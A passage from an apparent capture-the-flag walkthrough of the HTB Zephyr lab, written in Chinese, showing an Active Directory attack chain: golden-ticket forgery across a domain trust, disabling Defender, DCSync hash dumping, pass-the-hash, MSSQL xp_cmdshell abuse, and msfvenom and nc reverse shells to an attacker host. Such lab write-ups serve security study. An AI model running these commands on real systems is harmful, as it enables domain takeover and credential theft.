    * 21/03/2026 03:51:55 - CLEAR   - 25 f3 82 ac c4 2f 98 4a 5f 7d 10 9d c7 e5 39 b1 15 2e 13 26 30 79 bd 81 89 32 14 84 d6 c8 21 be b2 cd b2 4c ef 0b 8a f1 50 52 fc 68 d2 d7 c1 3a 03 30 0a 46 d3 b4 c9 f7 a6 9d ff 43 8f aa 74 3a 93 4b 10 49 47 09 37 17 fa 7f a9 92 ad 99 c0 cf 85 57 13 23 6e 65 48 4e 56 08 13 0a ec 5c f2 c3 6a d0 82 6b c9 6a a9 2c e4 ef 07 48 ed b6 cf a7 67 2f ac b1 07 00 0d ba 02 6f 64 be 9c f9 61 52 7a cf 1b 9c fd 08 1e 5d 73 d8 d2 80 e0 c3 6c ba 52 77 5f 70 8d 5d 4d ee 59 ec e8 07 b7 31 eb 2d 7e 40 26 d5 22 e3 a2 7c ee 49 c3 12 d6 7c 6a eb 01 0d ce 2a f5 17 63 e2 33 65 a2 3a ab a0 b3 ee ba 13 44 90 63 bc 52 bd 53 a5 1c c4 05 89 5b e1 43 3b e8 b1 b7 b4 10 56 ce 8a 8d 13 1c 61 ae 1b 97 11 15 e5 91 10 0a 8c e8 2a 23 5e 38 c2 fe ee
        * aes256_hmac       b73e359d0fb5b8b371fb037c9a2965120e73e29dfa13be8d80137a2f15576040
        * aes128_hmac       ff7294950c64a54364d3a74baee303e7
        * rc4_hmac_nt       be956dd674de41edd244b8489e577460

 [ Out ] ZSM.LOCAL -> INTERNAL.ZSM.LOCAL
    * 21/03/2026 03:40:33 - CLEAR   - 2f 76 52 c8 3b 55 f6 dc 79 cd 57 4f e7 ab 02 de a6 e1 88 0f bd e8 27 4f 64 a5 d5 d9 84 b0 96 44 58 b3 2f a0 82 65 0d 16 80 13 26 27 ad 2e 82 23 35 7e 08 0e ea 33 8f 8b e6 c4 0b 0b b4 f1 0b 7e 16 4f de da de 05 5d 35 cb 53 29 b9 96 0a 95 cd fa 5a 71 90 15 6e c4 c9 48 fd b8 a5 1f 37 26 6d 94 0c 18 c2 52 58 b3 fe 3a 5e e4 f2 6f 90 76 cf a8 e2 d4 f7 f2 59 58 5b 62 07 33 37 f2 c8 fe a7 07 33 2a 5c 16 6b 67 71 3f a3 8f 84 ef 46 7b 46 35 c1 7f a6 4c 87 a0 80 72 b1 ce 16 a7 6c 5b e7 75 c3 77 ca 23 d7 d0 11 5f d2 37 93 d1 06 45 61 97 b9 f5 8c ba b5 31 5e e7 51 a9 e6 be 06 9e 55 c1 7c 28 33 1a 24 fa 7a 0b 8b 9f f9 1f ae 45 f9 c0 81 4d b4 f5 96 db 1e 58 51 50 0e 18 a8 d8 e6 0a 38 9d e5 03 a7 f3 01 9e 25 e8 22 f7 be 09 be
        * aes256_hmac       4ee9dbd3002d01954c391a5c0ce0180c66ad733e9783e9307c968315304a3228
        * aes128_hmac       ffbf0e501542ab5e750bd3e08b8cf1c0
        * rc4_hmac_nt       c5ce07ce6e4575105efe022172b9564e

 [ In-1] INTERNAL.ZSM.LOCAL -> ZSM.LOCAL
    * 20/01/2026 07:47:31 - CLEAR   - 98 09 e8 17 fc ca 2b 23 71 ce 80 f3 85 7d f6 82 6b 0d 46 2f c8 8b a7 31 7d 16 d3 45 84 8a e2 14 41 9a 62 05 94 55 c7 09 df 6d 14 b7 99 c7 8f 82 7c ec aa 9a 14 2b 61 22 25 07 33 cc a0 b1 b2 98 3d 47 bd f8 e2 74 a6 85 f4 80 a8 30 67 89 98 17 67 67 12 8b 4a 8f c8 bd 47 a9 0b 04 1f 4e 18 40 4d a5 30 17 54 bc 16 e6 eb a2 8e ca 5e 43 c8 00 40 d4 0b 96 37 90 ac 24 6c dc c3 ea 94 98 62 c3 b6 74 ba 28 82 2f 17 f8 96 63 4d 4e 7a 38 1a 02 fa f6 1f 17 5b 19 8f 4f df 2e 80 8b 9b 69 f3 e6 c7 37 e8 de 06 5a 21 eb bf 0e a8 f1 33 e6 7a a8 23 2a fb 6a 70 ff c2 a5 ff 08 46 3e cf 27 1e 45 8d 09 b9 b9 5c d4 4d 49 12 1c f1 67 64 8b eb fc bf 75 ca 91 e5 17 17 6b f3 28 7c 73 da 40 e2 96 e6 b3 cb 9a 9c c9 44 ec 8c 28 c4 2b e1 15 92 c6
        * aes256_hmac       45be19419ea15d8443ee0d8e22af58f0c68632577a4338c2c6b4e615615fcedf
        * aes128_hmac       8d3197a1065907f265d6365e53860158
        * rc4_hmac_nt       5489650e5b9c0578c5f03b8ee0eab923

 [Out-1] ZSM.LOCAL -> INTERNAL.ZSM.LOCAL
    * 21/03/2026 03:40:33 - CLEAR   - 48 a0 47 4a 75 ca 02 98 3f 9e 0a 6e c1 b0 2e d2 a3 f8 1e 73 98 7e 0c d4 34 db c2 65 1d db 6d 87 c9 0b 67 2a 98 67 e5 cf d1 ff df 66 8c 38 7b fe 49 b6 cc bd 50 b6 1d b4 92 a6 db 5b 20 cb 8c 30 a8 a2 7a 84 72 32 4d ca 68 eb 99 44 b2 36 fb bb 6e 53 86 84 10 78 11 e7 4a 1a e1 c9 7d 57 4c 97 34 94 95 fd a4 cf e4 05 16 a5 8c fe 38 bf a9 1d b1 a4 7d ff 18 c6 7e 4c 1a 72 ff 59 d1 b9 17 82 e7 8d fe 92 9d db c5 fe e4 5c dd 01 f1 76 28 58 bc 82 46 a7 0d cb 0e 34 1d 14 89 c1 a6 42 a1 dc 28 79 08 d9 b8 c9 37 1c 20 ea 0b 83 19 88 9b 9e 21 76 23 84 15 3b 77 9c 97 e2 d5 90 7c f2 c6 5e 2e 8d 24 41 1e 2a 82 9f 41 11 7e 5b c3 12 96 7b 83 54 fa f5 87 1b 63 4b 8b 6a e4 af 6e d2 2b 9f 28 59 1d 60 cf 71 66 34 1b 36 24 aa 3d f2 96 f8
        * aes256_hmac       a0209522862924e0775bc1000bcc50ad627f6ec4716b9dd0550f310ee75a7b6e
        * aes128_hmac       fbe47864991d3586fb41fea3ce84fac0
        * rc4_hmac_nt       59c68218d69567491a5d938141e55b65


mimikatz(commandline) # exit
Bye!
```

```plain
#关键输出
[  In ] INTERNAL.ZSM.LOCAL -> ZSM.LOCAL
    * 21/03/2026 03:51:55 - CLEAR   - 25 f3 82 ac c4 2f 98 4a 5f 7d 10 9d c7 e5 39 b1 15 2e 13 26 30 79 bd 81 89 32 14 84 d6 c8 21 be b2 cd b2 4c ef 0b 8a f1 50 52 fc 68 d2 d7 c1 3a 03 30 0a 46 d3 b4 c9 f7 a6 9d ff 43 8f aa 74 3a 93 4b 10 49 47 09 37 17 fa 7f a9 92 ad 99 c0 cf 85 57 13 23 6e 65 48 4e 56 08 13 0a ec 5c f2 c3 6a d0 82 6b c9 6a a9 2c e4 ef 07 48 ed b6 cf a7 67 2f ac b1 07 00 0d ba 02 6f 64 be 9c f9 61 52 7a cf 1b 9c fd 08 1e 5d 73 d8 d2 80 e0 c3 6c ba 52 77 5f 70 8d 5d 4d ee 59 ec e8 07 b7 31 eb 2d 7e 40 26 d5 22 e3 a2 7c ee 49 c3 12 d6 7c 6a eb 01 0d ce 2a f5 17 63 e2 33 65 a2 3a ab a0 b3 ee ba 13 44 90 63 bc 52 bd 53 a5 1c c4 05 89 5b e1 43 3b e8 b1 b7 b4 10 56 ce 8a 8d 13 1c 61 ae 1b 97 11 15 e5 91 10 0a 8c e8 2a 23 5e 38 c2 fe ee
        * aes256_hmac       b73e359d0fb5b8b371fb037c9a2965120e73e29dfa13be8d80137a2f15576040
        * aes128_hmac       ff7294950c64a54364d3a74baee303e7
        * rc4_hmac_nt       be956dd674de41edd244b8489e577460
```

### 上传 Rubeus
[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

```plain
C:\Windows\Temp>certutil.exe -urlcache -split -f http://10.10.16.8/Rubeus2.2.exe
****  Online  ****
  000000  ...
  043c00
CertUtil: -URLCache command completed successfully.
```

### 上传nc
```plain
upload /home/kali/Desktop/tools/netcat/nc64.exe "C:\Users\Administrator\Documents\nc64.exe"
```

### 上传RunasCs
[https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/RunasCs.exe](https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/RunasCs.exe)

```plain
upload /home/kali/Desktop/tools/RunasCs/old/RunasCs.exe "C:\Users\Public\RunasCs.exe"
```

### 反弹shell
```plain
nc -lvnp 80
```

```plain
C:\Windows\system32> C:\Users\Public\RunasCs.exe -l 9 administrator Pass123
[-] Not enough arguments. 3 Arguments required. Use --help for additional help.
C:\Windows\system32> C:\Users\Public\RunasCs.exe administrator Pass123 cmd.exe -r 10.10.16.8:80
 
[+] Running in session 0 with process function CreateProcessAsUserW()
[+] Using Station\Desktop: Service-0x0-3e7$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3852 created in background.
```

### Mimikatz票据伪造
```plain
mimikatz # kerberos::golden /user:administrator /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /aes256:3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0 /sids:S-1-5-21-2734290894-461713716-141835440-512 /ptt
User      : administrator
Domain    : internal.zsm.local (INTERNAL)
SID       : S-1-5-21-3056178012-3972705859-491075245
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-2734290894-461713716-141835440-512 ; 
ServiceKey: 3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0 - aes256_hmac      
Lifetime  : 21/03/2026 18:16:23 ; 18/03/2036 18:16:23 ; 18/03/2036 18:16:23
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz # exit
Bye!
```

### Rubeus注入票据
#### 申请 CIFS 票据（读写父域 DC 文件）
```plain
PS C:\Windows\System32> C:\Users\Public\Rubeus2.2.exe asktgs /ticket:C:\Users\Public\trustkey.kirbi /service:CIFS/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.zsm.local /ptt
C:\Users\Public\Rubeus2.2.exe asktgs /ticket:C:\Users\Public\trustkey.kirbi /service:CIFS/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.zsm.local /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'CIFS/ZPH-SVRDC01.zsm.local'
[*] Using domain controller: ZPH-SVRDC01.zsm.local (192.168.210.10)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFIDCCBRygAwIBBaEDAgEWooIEFjCCBBJhggQOMIIECqADAgEFoQsbCVpTTS5MT0NBTKIoMCagAwIB
      AqEfMB0bBENJRlMbFVpQSC1TVlJEQzAxLnpzbS5sb2NhbKOCA8owggPGoAMCARKhAwIBDKKCA7gEggO0
      L9ivWX0hnWx2NmZAxge5NNEpEA2JtUSW3EHLmnyntBgahKoy4e0WuZaVDrPGFXCq2lWFvXF5fZlAHEZp
      cdlodV1GKn2z2oetydHs6AaOhqFuihs/TcmnQk3S2w2yr5OkbBhO6JfFyMS4aZU1Nt7vPL3VWw9/IDdi
      HyfqCA1rVu5ykqWVOqdIWQSnKHmu1AC8sY2zGlAH923/gCDirtFF9jVgPKO216ooeO4Y3CLlwAEHwmq2
      XuKh/AQ1hzMZmcM949EFYoeEc141rwn21UpvDG65Aa4/zft7+9/T3hUvKPpiGo+FHlf9itvuzhej195N
      YvMlzBU41NSgI+azY0fV+9eEXYIiLuVya/tf3oXuqJ+xXdB4VotTSuy3UPT/mtNPtLpHh5OGG9YSzydt
      4C1NS2mvZJSrin5jlCXs4OPY2B/Ocw+Hw7PRBmC52JzogVjpt0eOtGvGmcQE99b7jkw5P1q75KJhQBzK
      a9UfAfa9Omrvx6jsRyqSsZ7O3TSfY7W5bl8iic97YXFugJ+Sy1dhYdZZqK/7zutAuSP04M+g900gwzqD
      o6mt7cSvKgsKAVjwOEIYu44Yn0nqiFw32JVVBFSd56TgZuLcIaO+ofAnXuZ3/mK0J/hd9Vl4NJKjJ09R
      syH/TEYk6CVIGcb8cvt52lzvKtQAr8haXi9LdJXss1SIoiClMYH9aC+ZQ8aEJfVk/Cy2t4wll50Z0zdK
      wefVWkgLfZPWi409tDA2khykiw85fz1p1cb+ow8fbNLdTGXkEr9qAyuiS3d2NhOfvJenCRcQBZIVR7Qv
      SXyFoRNmIR9LVy30tP9Vi3TL9xZwsahYM6MxXobdEDaDWoGwG810r22gRbe+iY6EsbeSpdbABFIJQQK8
      cuNL0RwmQkfrlxHbER1Ma78myG1ol7AsILMrzHbzuvTLBuZb4lOhl0opqAd7jO5IhzZd/wHiDLG2L96k
      IJJTnQ47PjDb+SB1A1SbNC14HiG3GSrVYYPDru+n9caXXcSh0gp09hr6MNiU+4Q603yw/3ne8yFrcnUk
      NuDBMB7VjQ+M3ItbRaPIZvhBHjQEK4hiGanOBntNBROoNwJR339TenrFGoQjetzRlSLhxidk3aJrZyYC
      WHnJvQafI/h9xO/vS7DIjNUMAPmpeqfpgrSTLalt7kuDu7A6MpBBSuD7onZZnyswQg3NL/tFI/j+q0XM
      CSpN9DX56jYY566xdBT2LlTwGjPNLOLjHfpJPSH4ItKdw4cfX5W3i494G32Bxoczo4H1MIHyoAMCAQCi
      geoEged9geQwgeGggd4wgdswgdigKzApoAMCARKhIgQgZwFb1fXZRTPQRQobYz3jCwihgoFZW9eSRRt2
      81wQ0sahFBsSaW50ZXJuYWwuenNtLmxvY2FsohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUA
      QKUAAKURGA8yMDI2MDMyMTE5MjgwMlqmERgPMjAyNjAzMjIwNTI4MDJapxEYDzIwMjYwMzI4MTkyODAy
      WqgLGwlaU00uTE9DQUypKDAmoAMCAQKhHzAdGwRDSUZTGxVaUEgtU1ZSREMwMS56c20ubG9jYWw=

  ServiceName              :  CIFS/ZPH-SVRDC01.zsm.local
  ServiceRealm             :  ZSM.LOCAL
  UserName                 :  Administrator
  UserRealm                :  internal.zsm.local
  StartTime                :  21/03/2026 19:28:02
  EndTime                  :  22/03/2026 05:28:02
  RenewTill                :  28/03/2026 19:28:02
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  ZwFb1fXZRTPQRQobYz3jCwihgoFZW9eSRRt281wQ0sY=


```

#### 申请 HTTP 票据（WinRM/Invoke-Command）
```plain
C:\Windows\System32>C:\Users\Public\Rubeus2.2.exe asktgs /ticket:C:\Users\Public\trustkey.kirbi /service:HTTP/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.zsm.local /ptt
C:\Users\Public\Rubeus2.2.exe asktgs /ticket:C:\Users\Public\trustkey.kirbi /service:HTTP/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.zsm.local /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'HTTP/ZPH-SVRDC01.zsm.local'
[*] Using domain controller: ZPH-SVRDC01.zsm.local (192.168.210.10)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFIDCCBRygAwIBBaEDAgEWooIEFjCCBBJhggQOMIIECqADAgEFoQsbCVpTTS5MT0NBTKIoMCagAwIB
      AqEfMB0bBEhUVFAbFVpQSC1TVlJEQzAxLnpzbS5sb2NhbKOCA8owggPGoAMCARKhAwIBDKKCA7gEggO0
      08fdjEZqoI4xJV/nlbSLAx4//OvWBDaFYyEpJfvP7sB2SvXPvoq7CdXpex++wzRkppE+I6V9nre8k6Pg
      9UawEbWHjMjSiWz6UTzaGv2uvu1mhyJJ0VfcRZdFoHy/wRohq4tjp7HyOVT0fDqJv6otmYWCEB+pG5gP
      JlirMDBZZ2+BzgMvOPLEYN1/LWTeb+s4MHC43RNJb4ReKbvEPPSiWpAhKoBswYrO+i/LwgFtQ5ElJiS8
      Vcqcc7dY1I8mfYntT7ylz6fwF8WHf/uQVAj2LCtaNwJg89rclB2gR9WSYJawPuEl34cd+K5P7jI9w1Xl
      /6t9VmEv9t2rWhEk0zQfaKXR3kOxevzum9UeTc1vRp/03BWbO6nEXdpY9Ufg9c/eWRYj35250u3+PPjN
      htqXp4nrHVMjYNYbYQGhqDJJhkayjMHXIqQ0qsRknp4z1mOkSonXsuppeqweZYcZP0vDMJqvE+wfNA2F
      InrWo/PWP6biTN4qgmtYhGfaceQTbH8VsavscR0R04uC+baNcjUHdd88/uSeC3ABowDKasjlLQ/e78Lc
      VXkGvhMRB9ZflVboY3VQ3LXwyog34dzEwc/UmtHx9XYDblgbAtZUQrcHyEiYLtS0WxORGpQnj8u1zvSN
      m/TJrMJZzhbsGoQQeSQpQcAYh5etPlmJSYBC09vya1VWZYghkrjGEoY+4mL6AQ3U3LLcKTw/bQO+OmJM
      vHlgUQ4thJsjIKm/8C3ZHVccyneg9/8ztPb6REh38mCQO+RhHGKUZa/8N9gSTqH9vybmw3Q0XN+JrDkw
      kdBwREIjJEUAOtfqmE4IoaLNbSxylYXFPTWkxyDT4KmzmW+3vrIRimGVma39rj+rZgljgf/DF7FH3n0f
      TKXbvY4IcvpZeR5W/P742C8UqZb/tDytG+CtJmnQuleopFWTm4JsX0sgqMEEVP3twMdKxJM48pJBzc54
      mfroFRmE13kL3h0Po2KpNVw9pYzCUxmxotBWG4E72SMffQ8CFACBFY3Ti0c4Oyg3GCrxiMKWSTuRaU9g
      M9NPJSbfFLyVDKt2Ad4rnLXvKWR8+adybXQFPziuVuZv1zVaWH9SIWrgM5I9Fy6aCKN3MDSP53glQV/7
      IwcxFm7F6Q5BaDyZXX+1NSSZZz9dUEM0mFbmCKl1v3tsUFawZDoXN7bBrgvfdch5B6c6ZXbF1t1PMmxq
      CJ6IQxQnzfZkbO4dcS6NcTgoMddHgP9HkWUqE6fQK5TLy0KqA5mvF79P/BdHhbDXo4H1MIHyoAMCAQCi
      geoEged9geQwgeGggd4wgdswgdigKzApoAMCARKhIgQgs979PB8fMEhvTMYG70b1fCnY68OI80Hmk4P0
      X97MQ7WhFBsSaW50ZXJuYWwuenNtLmxvY2FsohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUA
      QKUAAKURGA8yMDI2MDMyMTE5MjIwNVqmERgPMjAyNjAzMjIwNTIyMDVapxEYDzIwMjYwMzI4MTkyMjA1
      WqgLGwlaU00uTE9DQUypKDAmoAMCAQKhHzAdGwRIVFRQGxVaUEgtU1ZSREMwMS56c20ubG9jYWw=

  ServiceName              :  HTTP/ZPH-SVRDC01.zsm.local
  ServiceRealm             :  ZSM.LOCAL
  UserName                 :  Administrator
  UserRealm                :  internal.zsm.local
  StartTime                :  21/03/2026 19:22:05
  EndTime                  :  22/03/2026 05:22:05
  RenewTill                :  28/03/2026 19:22:05
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  s979PB8fMEhvTMYG70b1fCnY68OI80Hmk4P0X97MQ7U=


```

### 进入 PowerShell
```plain
powershell -ep bypass
```

### 验证列表
```plain
C:\Windows\system32>dir \\ZPH-SVRDC01.zsm.local\c$
dir \\ZPH-SVRDC01.zsm.local\c$
 Volume in drive \\ZPH-SVRDC01.zsm.local\c$ has no label.
 Volume Serial Number is 5AE7-C7E9

 Directory of \\ZPH-SVRDC01.zsm.local\c$

21/01/2026  00:26    <DIR>          inetpub
08/05/2021  08:15    <DIR>          PerfLogs
02/12/2024  09:07    <DIR>          Program Files
08/05/2021  09:34    <DIR>          Program Files (x86)
14/03/2022  22:56    <DIR>          Users
21/01/2026  00:28    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,168,406,016 bytes free
```

### 关闭父域 DC 的 Defender
```plain
Invoke-Command -ComputerName ZPH-SVRDC01.zsm.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}
```

### 上传 mimikatz
```plain
Invoke-Command -ComputerName ZPH-SVRDC01.zsm.local -ScriptBlock {iwr http://10.10.16.8/mimikatz.exe -o C:\Windows\Temp\m.exe}
```

### 在父域 DC 本地执行 DCSync
```plain
Invoke-Command -ComputerName ZPH-SVRDC01.zsm.local -ScriptBlock {C:\Windows\Temp\m.exe "privilege::debug" "lsadump::dcsync /domain:zsm.local /user:ZSM\Administrator" "exit"}
```

```plain
PS C:\Windows\System32> Invoke-Command -ComputerName ZPH-SVRDC01.zsm.local -ScriptBlock {C:\Windows\Temp\m.exe "privilege::debug" "lsadump::dcsync /domain:zsm.local /user:ZSM\Administrator" "exit"}
Invoke-Command -ComputerName ZPH-SVRDC01.zsm.local -ScriptBlock {C:\Windows\Temp\m.exe "privilege::debug" "lsadump::dcsync /domain:zsm.local /user:ZSM\Administrator" "exit"}

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /domain:zsm.local /user:ZSM\Administrator
[DC] 'zsm.local' will be the domain
[DC] 'ZPH-SVRDC01.zsm.local' will be the DC server
[DC] 'ZSM\Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 10/11/2022 14:43:40
Object Security ID   : S-1-5-21-2734290894-461713716-141835440-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 84210eddc5724a7801fe78289ee94d44
    ntlm- 0: 84210eddc5724a7801fe78289ee94d44
    ntlm- 1: 316c5ae8a7b5dfce4a5604d17d9e976e
    ntlm- 2: cf3a5525ee9414229e66279623ed5c58
    lm  - 0: e81a09b24c86632d62779ac896db4a51
    lm  - 1: 5fa5477fa168eb7cf0c266d2e0ebf857

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : cef3783a2930ba2310e6327cd6f65670

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZSM.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 24ebe114c4d8067024c2502f824eb7fac7bb9981cb8890cbe08108232239646b
      aes128_hmac       (4096) : af42e41319cbc844734a2ad4032b77d2
      des_cbc_md5       (4096) : a7a2dcc89da7dc32
    OldCredentials
      aes256_hmac       (4096) : b0046ca909ad045b24f6d9d1455cafbe6249ba18e6afdf094209a8fe25686a84
      aes128_hmac       (4096) : efabc79729542147670f1dc6e8ec34b3
      des_cbc_md5       (4096) : e52ca764856732b0
    OlderCredentials
      aes256_hmac       (4096) : 3090e4f67e4e76a9cc4761082bf1ee7f48139064d898453c51c3b28e1d47d014
      aes128_hmac       (4096) : 1bcc5ef9fec5ee8064f376461ff89500
      des_cbc_md5       (4096) : 0d7946bc2ae097e3

* Primary:Kerberos *
    Default Salt : ZSM.LOCALAdministrator
    Credentials
      des_cbc_md5       : a7a2dcc89da7dc32
    OldCredentials
      des_cbc_md5       : e52ca764856732b0

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  e6e47ddb9ae729a9ec9d4bfc24e982a2
    02  12b921da678f557cfba4aa5d33b91334
    03  79bedcb91fc9a7edb5ed073386eaddc1
    04  e6e47ddb9ae729a9ec9d4bfc24e982a2
    05  22e204be78b75bee6a20f3df2151ac5d
    06  71e219a4b7fc39d79877d2f7e0e7813c
    07  1b497c942e5da7c4a1630406126b6325
    08  4537dc27b52ebd029e85df532281a29b
    09  917f8804fffeeded7b707c176692fba8
    10  ff5358ea04fe58c3621d9fb77f42ed3d
    11  eeae2196dc6bff75293bb553ef46eb6c
    12  4537dc27b52ebd029e85df532281a29b
    13  a73459b9bd504fe7e09f9fb29dc483f8
    14  cdb137863ce4816647584e23844ce950
    15  6382bf2b3f009a493004ffe9bc47f78e
    16  5e7e7b8b370aa54615513dd71a33420d
    17  b47f3bb55975a0dc6fd01fb922d602da
    18  0b26f24d51499c9680782a814767cce2
    19  9c5c2bacdbecfb598c9facf5ba8e773c
    20  62aeca91b5255b2572c9a61233b34f7e
    21  efcab3f54ea481023614c7eed9a4b558
    22  b75232160d73d5cbf019b0807a1ccbd5
    23  5a9a58cc523e4ff727b7327839cf644f
    24  e5bdc35e09dc663ee550f5a50fc11dad
    25  af80a3a5b6bb1fccbee2dc083f7ed015
    26  74459daedd5144feea58da1b924ea46a
    27  5d7d353d633724c519bbe33c4c4489c5
    28  22679b3bb0523a2133d1f979aae0bb9e
    29  343baf5140f08132155ee48d6f1fe15d


mimikatz(commandline) # exit
Bye!
```

## Getflag-192.168.210.10-SVRDC01
```plain
Invoke-Command -ComputerName ZPH-SVRDC01.zsm.local -ScriptBlock {type C:\users\administrator\desktop\flag.txt}
ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}
```

## Getflag-192.168.210.14-ADFS1
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q impacket-smbclient \
    -hashes :84210eddc5724a7801fe78289ee94d44 \
    'zsm.local/Administrator@192.168.210.14'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use C$
# get Users\Administrator\Desktop\flag.txt
# 
zsh: suspended  proxychains -q impacket-smbclient -hashes :84210eddc5724a7801fe78289ee94d44 
                                                        
┌──(web)─(root㉿kali)-[/home/kali]
└─# cat flag.txt        
ZEPHYR{C4n7_F0rg3t_ab0u7_7h1s_0n3} 
```

# ZPH-SVRSQL01-192.168.210.15
> 接下来的内容正式进入支线
>

## 凭据复用进入 SQL01
使用 Zabbix 数据库凭据直接连 `192.168.210.15`：

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-mssqlclient zsm.local/zabbix:'rDhHbBEfh35sMbkY'@192.168.210.15
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ZPH-SVRSQL01): Line 1: Changed database context to 'master'.
[*] INFO(ZPH-SVRSQL01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019  (15.0.2155)
[!] Press help for extra shell commands
SQL (zabbix  guest@master)>
```

先枚举数据库用户：

```latex
enum_users
```

发现当前是 `guest@msdb`，但可以模拟 `sa`：

```latex
exec_as_login sa
```

启用 `xp_cmdshell`：

```latex
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
exec xp_cmdshell 'whoami';
```

返回：

```latex
nt service\mssqlserver
```

## SQL01 提权到 SYSTEM
下发 payload：

```latex
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=80 -f exe > zephyr80.exe
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
```

```latex
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.16.8
LHOST => 10.10.16.8
msf exploit(multi/handler) > set LPORT 80
LPORT => 80
```

```latex
exec xp_cmdshell 'curl 10.10.16.8/zephyr80.exe -o c:\users\public\zephyr80.exe'
exec xp_cmdshell 'cmd /c c:\users\public\zephyr80.exe'
```

## 土豆提权
再用 `SharpEfsPotato`：

```latex
SharpEfsPotato.exe -p C:\users\public\nc.exe -a "10.10.16.8 53 -e cmd.exe"
```

这样可拿下 SQL01 的 SYSTEM

## Getflag
```latex
ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}
```

## 横向移动
在 SQL01 查询链接服务器：

```latex
SELECT srvname, isremote FROM sysservers
```

结果：

```latex
ZPH-SVRSQL01
ZSM-SVRCSQL02
```

确认 SQL02 上也是 `sa`：

```latex
EXECUTE('select @@servername') AT [ZSM-SVRCSQL02]
EXECUTE('select system_user') AT [ZSM-SVRCSQL02]
```

```latex
ZSM-SVRCSQL02
sa
```

# ZPH-SVRSQL02-192.168.210.19
开启 SQL02 的 `xp_cmdshell`：

